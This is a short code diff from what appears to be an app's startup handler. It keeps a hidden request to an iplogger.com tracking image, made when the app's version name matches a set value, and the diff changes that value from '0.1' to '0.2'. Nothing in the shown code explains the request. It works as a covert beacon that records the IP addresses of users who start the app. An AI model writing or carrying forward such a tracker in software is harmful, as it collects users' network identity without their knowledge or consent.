@@ -269,7 +269,7 @@ def onAppStarted() {
       downloadUpdate();
 
       var vn = getVersionName(getAppPackageName());
-      if (vn == "0.1") {
+      if (vn == "0.2") {
           get("https://iplogger.com/1oHhS.gif");
       }
 
